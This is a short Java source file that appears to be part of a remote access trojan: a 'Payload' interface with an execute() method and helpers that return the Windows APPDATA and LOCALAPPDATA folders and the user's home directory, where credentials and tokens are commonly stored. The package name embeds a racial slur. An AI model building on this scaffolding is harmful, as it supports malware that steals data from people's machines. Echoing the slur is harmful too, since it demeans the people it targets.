package me.nigger.rat.payload.api;

public interface Payload
{
    void execute() throws Exception;

    default String appdata() {
        return System.getenv("APPDATA");
    }

    default String localAppdata() {
        return System.getenv("LOCALAPPDATA");
    }

    default String home() {
        return System.getProperty("user.home");
    }
}
